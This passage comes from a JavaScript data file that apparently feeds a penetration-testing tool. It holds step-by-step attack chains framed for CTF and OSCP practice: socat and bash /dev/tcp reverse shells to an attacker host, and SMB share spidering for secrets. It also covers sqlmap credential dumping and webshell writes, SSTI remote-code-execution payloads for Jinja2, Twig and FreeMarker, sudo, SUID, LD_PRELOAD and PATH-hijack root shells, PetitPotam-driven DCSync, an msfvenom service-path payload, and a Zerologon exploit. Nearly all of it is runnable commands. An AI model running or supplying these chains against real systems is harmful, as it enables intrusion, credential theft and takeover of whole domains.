          "name": "Step 2 — Set TERM + size",
          "inline_command": "export TERM=xterm-256color; export SHELL=/bin/bash"
        },
        {
          "id": "background",
          "name": "Step 3 — Background the shell (CTRL+Z), tweak local terminal",
          "inline_command": "# Press CTRL+Z to suspend, then on your local term:\nstty raw -echo; fg\n# (the prompt disappears — that's expected — hit Enter)\nreset"
        },
        {
          "id": "size_terminal",
          "name": "Step 4 — Match terminal rows/cols",
          "inline_command": "# On your local term first, get values:\nstty size\n# Then back in the shell:\nstty rows <ROWS> cols <COLS>\n"
        },
        {
          "id": "confirm",
          "name": "Confirm: arrow keys, vim, CTRL+C all work",
          "inline_command": "vim /tmp/x  # if it opens cleanly + you can :q out, you're good"
        },
        {
          "id": "alternative_socat",
          "name": "Alternative: open a fresh socat full-TTY shell",
          "inline_command": "# Attacker (listen):\nsocat file:`tty`,raw,echo=0 tcp-listen:<lport>\n# Victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>\n",
          "inputs": {
            "lport": "${lport}"
          },
          "notes": "No upgrade needed — socat gives you a full-fidelity shell from the\nstart. Both ends need socat installed.\n"
        }
      ],
      "references": [
        {
          "title": "Ropnop — TTY upgrade reference",
          "url": "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
        },
        {
          "title": "HackTricks — Shells (Linux)",
          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/linux.html"
        }
      ]
    },
    {
      "id": "smb-null-session-enum",
      "name": "Recon — SMB null/guest session enumeration",
      "description": "Anonymous/guest SMB enumeration to harvest users, shares, and password policy without any credentials. Classic OSCP/HTB starting point when ports 139/445 are open and signing isn't strictly enforced.\n",
      "tags": [
        "recon",
        "smb",
        "null-session",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "shares",
          "name": "List shares with null session",
          "command_ref": "nxc-smb-shares",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Look for shares with READ/WRITE that aren't SYSVOL/NETLOGON/IPC$/Print$.\nA writable share = potential web-shell drop / phishing bait / DLL planting.\n"
        },
        {
          "id": "users",
          "name": "Enumerate users",
          "command_ref": "nxc-smb-users",
          "inputs": {
            "ip": "${target_ip}"
          },
          "capture": [
            {
              "var": "user_list",
              "regex": "^[A-Z]+\\s+\\S+\\s+\\d+\\s+\\S+\\\\([A-Za-z0-9._-]+)",
              "match": "all"
            }
          ]
        },
        {
          "id": "groups",
          "name": "Enumerate groups",
          "command_ref": "nxc-smb-groups",
          "inputs": {
            "ip": "${target_ip}"
          }
        },
        {
          "id": "password_policy",
          "name": "Check password policy",
          "inline_command": "nxc smb <ip> -u '' -p '' --pass-pol",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Knowing the lockout threshold is critical before spraying. <5 = risky.\n"
        },
        {
          "id": "spider_readable",
          "name": "Spider any readable share for secrets",
          "command_ref": "nxc-smb-spider",
          "requires": [],
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Grep results for `password`, `pwd`, `cred`, web.config, unattend.xml,\nGroups.xml (cpassword), and SSH/RDP key files.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Pentesting SMB",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html"
        },
        {
          "title": "NetExec SMB module",
          "url": "https://www.netexec.wiki/smb-protocol"
        }
      ]
    },
    {
      "id": "sqli-to-os-shell",
      "name": "Web → Shell — SQL injection → OS shell",
      "description": "Confirm SQLi, fingerprint the DBMS, dump credentials, and pivot to OS command execution via the DB engine's native facility (xp_cmdshell on MSSQL, sys_exec on MySQL UDF, COPY FROM PROGRAM on Postgres). sqlmap handles 80% of the heavy lifting.\n",
      "tags": [
        "web",
        "sqli",
        "sqlmap",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Vulnerable URL with injectable parameter.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_sqli",
          "name": "Confirm SQLi with sqlmap",
          "inline_command": "sqlmap -u '<url>' --batch --random-agent --level=2 --risk=2",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "For POST/JSON/multipart: use `-r request.txt` (save the request from\nBurp). Add `--cookie=` for authenticated injections.\n"
        },
        {
          "id": "enumerate",
          "name": "Dump dbs / tables / users / current-user",
          "inline_command": "sqlmap -u '<url>' --batch --dbs --is-dba --current-user --hostname",
          "inputs": {
            "url": "${target_url}"
          },
          "capture": [
            {
              "var": "db_user",
              "regex": "current user:\\s+([^\\s\\n]+)",
              "match": "first"
            },
            {
              "var": "dbs",
              "regex": "available databases \\[\\d+\\]:[\\s\\S]*?(?=back-end|\\Z)",
              "match": "first"
            }
          ]
        },
        {
          "id": "dump_creds",
          "name": "Dump users/password tables for credential reuse",
          "inline_command": "sqlmap -u '<url>' --batch -D <db> -T users --dump",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Common table names: users, accounts, members, admins. Dumped hashes\n→ hashcat / John. Reuse cracked passwords on SSH, RDP, the admin\npanel, AD if domain-joined.\n"
        },
        {
          "id": "os_shell_branch",
          "branch": [
            {
              "when": "db_user",
              "label": "MSSQL → xp_cmdshell via sqlmap",
              "inline_command": "sqlmap -u '<url>' --batch --os-shell"
            },
            {
              "when": "db_user",
              "label": "MySQL → INTO OUTFILE webshell",
              "inline_command": "sqlmap -u '<url>' --batch --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php"
            },
            {
              "when": "db_user",
              "label": "PostgreSQL → COPY FROM PROGRAM",
              "inline_command": "sqlmap -u '<url>' --batch --os-cmd='id'"
            }
          ]
        },
        {
          "id": "upgrade_shell",
          "name": "Move to a real reverse shell",
          "inline_command": "# In the os-shell or via the webshell:\n# bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "HackTricks — SQLi",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html"
        },
        {
          "title": "sqlmap usage",
          "url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
        }
      ]
    },
    {
      "id": "ssti-to-rce",
      "name": "Web → Shell — Server-Side Template Injection (Jinja2 / Twig / FreeMarker)",
      "description": "Fingerprint the template engine, find a sandbox bypass, hit RCE. The classic 7×7 / ${{7*7}} test tells you which engine you're hitting, and the chosen-engine sandbox bypass gives you shell.\n",
      "tags": [
        "web",
        "ssti",
        "jinja",
        "twig",
        "freemarker",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "URL where reflected user input passes through a template engine.",
          "required": true
        },
        {
          "name": "parameter",
          "description": "Parameter name being templated."
        }
      ],
      "steps": [
        {
          "id": "fingerprint",
          "name": "Engine fingerprint (try all the syntaxes)",
          "inline_command": "# Try each — note which returns 49 (= 7*7):\ncurl '<url>?<p>={{7*7}}'         # Jinja2 / Twig / Liquid\ncurl '<url>?<p>=${7*7}'          # FreeMarker / Velocity / SpEL\ncurl '<url>?<p>=<%= 7*7 %>'      # ERB (Ruby)\ncurl '<url>?<p>=#{7*7}'          # Smarty / Spring\ncurl '<url>?<p>={{ self }}'      # Jinja2 (shows the env)\n",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          },
          "notes": "The differentiator is the second-line probe:\n  Jinja2 → `{{ config.items() }}` shows app config\n  Twig   → `{{ _self.env }}` exposes the env\n  FreeMarker → `${\"freemarker.template.utility.Execute\"?new()(\"id\")}`\n"
        },
        {
          "id": "jinja2_rce",
          "name": "Jinja2 / Flask RCE (escape sandbox)",
          "inline_command": "curl '<url>?<p>={{cycler.__init__.__globals__.os.popen(\"id\").read()}}'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          },
          "notes": "Modern Jinja2 sandbox escape via cycler. Older payloads:\n  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\nThe subclass index varies — enumerate with `__subclasses__()`.\n"
        },
        {
          "id": "twig_rce",
          "name": "Twig RCE",
          "inline_command": "curl '<url>?<p>={{[\"id\"]|filter(\"system\")}}'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          }
        },
        {
          "id": "freemarker_rce",
          "name": "FreeMarker RCE",
          "inline_command": "curl '<url>?<p>=<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'",
          "inputs": {
            "url": "${target_url}",
            "p": "${parameter}"
          }
        },
        {
          "id": "rev_shell",
          "name": "Pop a reverse shell once RCE works",
          "inline_command": "# Replace `id` with one of the rsg-* commands (bash -i revshell). URL-encode + escape quotes carefully.",
          "notes": "Pair with WannaHack's commands/payloads/ (rsg-reverseshell-bash-i,\nrsg-reverseshell-python-1, etc). For most engines, a simple base64\nof the bash payload avoids quoting nightmares.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — SSTI",
          "url": "https://portswigger.net/research/server-side-template-injection"
        },
        {
          "title": "HackTricks — SSTI",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
        }
      ]
    },
    {
      "id": "sudo-gtfobins-escalation",
      "name": "Linux PE — sudo allowed binary → GTFOBins → root",
      "description": "`sudo -l` returned a list. For each binary the user can sudo, GTFOBins has a one-liner that spawns a root shell or reads /etc/shadow. This chain bridges them.\n",
      "tags": [
        "linux",
        "priv-esc",
        "sudo",
        "gtfobins"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "sudo_allowed",
          "description": "From the linux-priv-esc-recon chain (or run sudo -l yourself)."
        }
      ],
      "steps": [
        {
          "id": "list_sudo",
          "name": "Re-list sudo allowances (in case it expired)",
          "inline_command": "sudo -l"
        },
        {
          "id": "open_gtfo_search",
          "name": "Look the binary up in WannaHack's GTFOBins library",
          "inline_command": "echo 'In WannaHack: switch to Commands mode, filter by \"gtfobins\", search for the binary name. Pick the sudo variant.'",
          "notes": "The GTFOBins KB sync gives every binary its own command entry under\ncommands/gtfobins/. Click Copy in the card and run it as the sudoers\nline allows.\n"
        },
        {
          "id": "typical_examples",
          "name": "Common quickwins (try these first)",
          "inline_command": "# find\nsudo find . -exec /bin/sh \\; -quit\n# vim\nsudo vim -c ':!/bin/sh'\n# nmap (interactive mode, old)\nsudo nmap --interactive\n# less / more / man\nsudo less /etc/profile  # then `!sh`\n# python\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n# awk\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\n",
          "notes": "90% of HTB/OSCP sudo abuses land on one of these. If yours isn't\nhere, hit GTFOBins.\n"
        },
        {
          "id": "env_keep_check",
          "name": "Check env_keep tricks (LD_PRELOAD / PYTHONPATH)",
          "inline_command": "sudo -l | grep env_keep",
          "notes": "`env_keep+=LD_PRELOAD` → compile a tiny .so that execve's /bin/sh,\n`sudo LD_PRELOAD=/tmp/x.so <any_allowed_program>`.\nSample .so:\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <unistd.h>\n  void _init() { unsetenv(\"LD_PRELOAD\"); setuid(0); execve(\"/bin/sh\", NULL, NULL); }\nCompile: gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n"
        },
        {
          "id": "confirm_root",
          "name": "Confirm root",
          "inline_command": "id",
          "notes": "Expected: `uid=0(root) gid=0(root) groups=0(root)`.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins",
          "url": "https://gtfobins.github.io/"
        },
        {
          "title": "Sudo env_keep abuse",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload"
        }
      ]
    },
    {
      "id": "suid-binary-escalation",
      "name": "Linux PE — SUID binary abuse",
      "description": "SUID-root binary in the wild → check GTFOBins for the SUID variant. If a custom binary, reverse it for shell-out, env, or relative-path hijack opportunities.\n",
      "tags": [
        "linux",
        "priv-esc",
        "suid",
        "gtfobins"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "suid_binaries",
          "description": "Array from linux-priv-esc-recon (or run `find / -perm -4000` yourself)."
        }
      ],
      "steps": [
        {
          "id": "list_suid",
          "name": "Re-list SUID binaries",
          "inline_command": "find / -perm -4000 -type f 2>/dev/null",
          "capture": [
            {
              "var": "suid_binaries",
              "regex": "^(/[^\\s]+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "triage",
          "name": "Triage: GTFOBins-known vs custom",
          "inline_command": "echo 'Filter your SUID list against gtfobins/. Anything NOT in GTFOBins is likely custom — read it / ltrace it / strings it.'",
          "notes": "Known SUID quickwins (try first, all in commands/gtfobins/):\n • find        → -exec /bin/sh -p \\; -quit\n • cp          → overwrite /etc/shadow with attacker hash\n • python      → -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n • bash        → bash -p\n • nmap        → --interactive (old) / nse script\n • screen / tmux\n"
        },
        {
          "id": "custom_binary",
          "name": "Custom SUID — common vectors",
          "inline_command": "strings /path/to/binary | head -50; ltrace /path/to/binary 2>&1 | head -20",
          "notes": "Look for:\n  • system(\"ls\") with no abs path → PATH hijack (write `ls` in /tmp,\n    export PATH=/tmp:$PATH, run binary).\n  • execve(\"/bin/ls\", ...) with $LD_LIBRARY_PATH consulted → library\n    hijack.\n  • Reading config from $HOME/.something → symlink to /etc/shadow.\n  • Calling a wrapper script with relative path → write the wrapper.\n"
        },
        {
          "id": "env_abuse",
          "name": "PATH hijack example",
          "inline_command": "cat > /tmp/ls <<'EOF'\n#!/bin/sh\ncp /bin/bash /tmp/.r && chmod +s /tmp/.r\nEOF\nchmod +x /tmp/ls\nexport PATH=/tmp:$PATH\n/path/to/suid-binary  # triggers /tmp/ls as root\n/tmp/.r -p  # root shell\n",
          "notes": "Works whenever the SUID binary invokes another command via PATH lookup\n(e.g. system(\"ls\")) without setting a clean environment.\n"
        }
      ],
      "references": [
        {
          "title": "GTFOBins — SUID",
          "url": "https://gtfobins.github.io/#+suid"
        },
        {
          "title": "HackTricks — SUID escalation",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid"
        }
      ]
    },
    {
      "id": "unconstrained-delegation-printerbug",
      "name": "AD — Unconstrained delegation + PrinterBug (capture DC TGT)",
      "description": "When you own a host with TrustedForDelegation = TRUE, any service the host receives a Kerberos ticket for hands over a usable TGT for that account. PrinterBug/PetitPotam coerces the DC into authenticating to you, and you walk away with the DC's TGT (and therefore DCSync rights).\n",
      "tags": [
        "unconstrained-delegation",
        "printerbug",
        "petitpotam",
        "priv-esc",
        "kerberos"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "unconstrained_host",
          "description": "FQDN of the host you've compromised that has unconstrained delegation.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_unconstrained",
          "name": "Confirm the host is TrustedForDelegation",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "Output should include `<unconstrained_host>$  Unconstrained  TrustedForDelegation`.\nIf only TRUSTED_TO_AUTH_FOR_DELEGATION appears, it's constrained, not\nunconstrained — use the constrained-delegation chain instead.\n"
        },
        {
          "id": "rubeus_monitor",
          "name": "Start a TGT monitor on the unconstrained host",
          "inline_command": "Rubeus.exe monitor /interval:5 /filteruser:<DC_NAME>$",
          "notes": "Run as SYSTEM on the compromised host. The filter limits noise to\nDC machine-account TGTs only. Leave it running while you fire the\ncoercer from another shell.\n"
        },
        {
          "id": "trigger_petitpotam",
          "name": "PetitPotam coerce the DC to authenticate to you",
          "command_ref": "nxc-smb-petitpotam",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "If PetitPotam is patched try the PrinterBug RPC instead\n(`Coercer.py coerce -t <dc-ip> -l <unconstrained-host-ip>`).\nEither way the DC sends an NTLM/Kerberos auth to your monitor.\n"
        },
        {
          "id": "extract_tgt",
          "name": "Convert the captured base64 TGT → ccache",
          "inline_command": "echo '<base64_tgt_from_rubeus>' | base64 -d > dc.kirbi; ticketConverter.py dc.kirbi dc.ccache; export KRB5CCNAME=dc.ccache",
          "notes": "Rubeus prints the TGT as base64; ticketConverter from Impacket turns\nit into a ccache impacket tools accept.\n"
        },
        {
          "id": "dcsync",
          "name": "DCSync the entire domain with the DC's TGT",
          "inline_command": "impacket-secretsdump -k -no-pass -just-dc -outputfile dcsync '<domain>/<DC_NAME>$@<dc-ip>'",
          "inputs": {
            "domain": "${domain}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "You now hold every NTLM hash and Kerberos key in the domain,\nincluding krbtgt → can mint Golden Tickets at will.\n"
        }
      ],
      "references": [
        {
          "title": "Unconstrained delegation abuse — Wagging the Dog",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        },
        {
          "title": "PetitPotam",
          "url": "https://github.com/topotam/PetitPotam"
        }
      ]
    },
    {
      "id": "unquoted-service-path",
      "name": "Windows PE — unquoted service path → SYSTEM",
      "description": "A service whose binPath contains spaces but isn't quoted is exploitable when any intermediate directory is writable. Windows tries each prefix in turn (`C:\\Program Files\\App\\bin.exe` → try `C:\\Program.exe`, `C:\\Program Files\\App.exe`, etc.). Drop a malicious `.exe` and restart.\n",
      "tags": [
        "windows",
        "priv-esc",
        "services",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "find_unquoted",
          "name": "Find unquoted service paths",
          "inline_command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\"",
          "notes": "Only services in AUTO start (or that you can restart) matter. The\ngrep filters out the protected windows\\\\ paths and any path already\nquoted.\n"
        },
        {
          "id": "check_writable",
          "name": "Check writability of each intermediate directory",
          "inline_command": "icacls \"C:\\Program Files\\Vulnerable Folder\"",
          "notes": "Look for `(F)` (full) or `(M)` (modify) on Users / Authenticated\nUsers / BUILTIN\\\\Users / the current account. Repeat per directory\nlevel in the path until you find one you can write.\n"
        },
        {
          "id": "stage_payload",
          "name": "Stage your payload as Program.exe / Service.exe etc.",
          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o \"C:\\\\Program Files\\\\Vulnerable\\\\Program.exe\"\n",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          },
          "notes": "The name must match the intermediate prefix. Example for path\n`C:\\Program Files\\Vulnerable Folder\\App\\bin.exe` with `Vulnerable Folder`\nwritable, drop `Vulnerable.exe` inside `C:\\Program Files\\`.\n"
        },
        {
          "id": "trigger",
          "name": "Restart the service (or wait for the next boot)",
          "inline_command": "sc stop <ServiceName>; sc start <ServiceName>",
          "notes": "If you can't restart it, use shutdown -r -t 0 / wait for cron-like\nrestart, or pick a service that runs on user logon.\n"
        },
        {
          "id": "catch_shell",
          "name": "Catch the SYSTEM reverse shell",
          "inline_command": "nc -lvnp <lport>",
          "inputs": {
            "lport": "4444"
          },
          "notes": "Use rlwrap nc for line editing. Stabilize the shell with\n`python -c 'import pty;pty.spawn(\\\"/bin/sh\\\")'` (n/a on Windows — use\nPowershell's Invoke-PowerShellTcp).\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Unquoted Service Path",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths"
        }
      ]
    },
    {
      "id": "windows-priv-esc-recon",
      "name": "Windows PE — recon (winpeas/seatbelt/whoami)",
      "description": "Standard Windows local-priv-esc enumeration. Tells you which of the classic escalation paths is open (token impersonation, service abuse, AlwaysInstallElevated, stored creds, scheduled tasks).\n",
      "tags": [
        "windows",
        "priv-esc",
        "recon",
        "post-exploitation"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "whoami_priv",
          "name": "Show privileges & groups",
          "inline_command": "whoami /all",
          "notes": "SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → Potato\nattack to SYSTEM. SeBackup / SeRestore → registry-hive dump.\nSeDebug → process memory access.\n",
          "capture": [
            {
              "var": "privs_enabled",
              "regex": "^(Se\\w+)\\s+\\S+\\s+(Enabled|Disabled)$",
              "match": "all",
              "groups": {
                "name": 1,
                "state": 2
              }
            }
          ]
        },
        {
          "id": "systeminfo",
          "name": "Patch level & arch",
          "inline_command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\"",
          "notes": "Compare missing hotfixes against Sherlock/Watson DB. Old patch level\n+ x64 + no AV = kernel exploit candidate.\n"
        },
        {
          "id": "services",
          "name": "Vulnerable service config (unquoted/weakperm)",
          "inline_command": "wmic service get name,pathname,startname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\"",
          "notes": "Look for paths with spaces and no quotes → unquoted-service-path.\nThen check `icacls <path>` for `(F)` (full) or `(M)` (modify) on\nAuthenticated Users / Users.\n"
        },
        {
          "id": "alwaysinstallelevated",
          "name": "AlwaysInstallElevated check",
          "inline_command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n",
          "notes": "Both = 0x1 → craft an msi with msfvenom and `msiexec /quiet /i x.msi`\nto spawn SYSTEM.\n"
        },
        {
          "id": "stored_creds",
          "name": "Stored credentials",
          "inline_command": "cmdkey /list; dir /s C:\\Users\\*unattend* C:\\Users\\*sysprep* 2>nul",
          "notes": "cmdkey targets → `runas /savecred /user:<...> cmd.exe`. Unattend.xml\noften has cleartext local admin password (legacy deployments).\n"
        },
        {
          "id": "winpeas",
          "name": "winpeas (full sweep — read the RED items)",
          "inline_command": "powershell -c \"iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winpeas.exe; .\\winpeas.exe\"",
          "notes": "Heavy but the RED tags are gold: AlwaysInstallElevated, Always Install,\nmissing patches, exploitable services, AutoLogon registry, etc.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Windows PE",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
        },
        {
          "title": "PEASS-ng",
          "url": "https://github.com/peass-ng/PEASS-ng"
        }
      ]
    },
    {
      "id": "zerologon-cve-2020-1472",
      "name": "AD — Zerologon (CVE-2020-1472) DC takeover",
      "description": "Unauthenticated reset of the DC machine-account password to empty by abusing a flawed AES-CFB8 IV. Restore the original hash after DCSync to avoid breaking the domain. Patched in August 2020 — still landing on every legacy/lab box.\n",
      "tags": [
        "zerologon",
        "cve-2020-1472",
        "priv-esc",
        "classic-windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "IP of the DC.",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "dc_name",
          "description": "NetBIOS name of the DC (e.g. DC01).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "vuln_check",
          "name": "Confirm the DC is vulnerable",
          "command_ref": "nxc-zerologon",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "NetExec's --zerologon module probes safely without resetting anything.\n`[+] VULNERABLE` is the green light.\n"
        },
        {
          "id": "backup_original_hash",
          "name": "Save the current DC machine-account hash first",
          "inline_command": "impacket-secretsdump -just-dc-user '<dc_name>$' -no-pass '<domain>/'@<dc_ip>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "notes": "BEFORE detonating Zerologon, capture the current hash — you'll\nrestore it after DCSync or risk leaving the DC unable to authenticate.\n"
        },
        {
          "id": "detonate",
          "name": "Reset the DC machine-account password to empty",
          "inline_command": "git clone https://github.com/dirkjanm/CVE-2020-1472 /tmp/zlog; python3 /tmp/zlog/cve-2020-1472-exploit.py <dc_name> <dc_ip>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          }
        },
        {
          "id": "dcsync",
          "name": "DCSync with the empty machine-account hash",
          "inline_command": "impacket-secretsdump -no-pass -just-dc '<dc_name>$@<dc_ip>'",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "^Administrator:500:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            },
            {
              "var": "krbtgt_nt_hash",
              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            }
          ]
        },
        {
          "id": "restore_hash",
          "name": "RESTORE the original DC hash (do not skip!)",
          "inline_command": "python3 /tmp/zlog/restorepassword.py <dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <ORIGINAL_HEX_HASH>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "notes": "Without restore, AD replication breaks and any tooling expecting the\nDC$ account to authenticate fails. Even in CTFs, restore — the box\nmay be reused by other players.\n"
        }
      ],
      "references": [
        {
          "title": "CVE-2020-1472 (Secura analysis)",
          "url": "https://www.secura.com/blog/zero-logon"
        },
        {
          "title": "dirkjanm/CVE-2020-1472",
          "url": "https://github.com/dirkjanm/CVE-2020-1472"
        }
      ]
    }
  ]
};

if (typeof module !== "undefined" && module.exports) {
  module.exports = { CHAIN_DATA };
} else {
  window.CHAIN_DATA = CHAIN_DATA;
}
